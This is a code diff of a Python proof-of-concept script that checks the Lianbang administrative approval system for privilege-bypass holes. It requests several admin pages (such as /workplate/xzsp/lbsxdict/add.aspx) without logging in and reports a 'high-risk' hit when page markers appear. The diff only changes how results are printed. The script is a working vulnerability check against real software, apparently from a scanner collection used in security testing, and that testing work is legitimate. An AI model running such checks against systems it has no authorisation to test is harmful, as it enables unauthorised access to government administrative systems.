@@ -10,8 +10,8 @@ description: 1./workplate/xzsp/kqgl/kqsz/kqsz.aspx（无需登陆直接对系统
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class lianbang_multi_bypass_priv_BaseVerify:
     def __init__(self, url):
@@ -26,22 +26,22 @@ class lianbang_multi_bypass_priv_BaseVerify:
         try:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"tbPmSignOff" in req.text:
-                cprint("[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl
 
             vulnurl = self.url + "/workplate/xzsp/lbsxdict/add.aspx"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"xksxid" in req.text:
-                cprint("[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl
 
             vulnurl = self.url + "/workplate/base/operation/add.aspx"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"tbDescr" in req.text:
-                cprint("[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return "[+]存在连邦行政审批系统越权漏洞...(高危)\tpayload: "+vulnurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = lianbang_multi_bypass_priv_BaseVerify(sys.argv[1])
     testVuln.run()
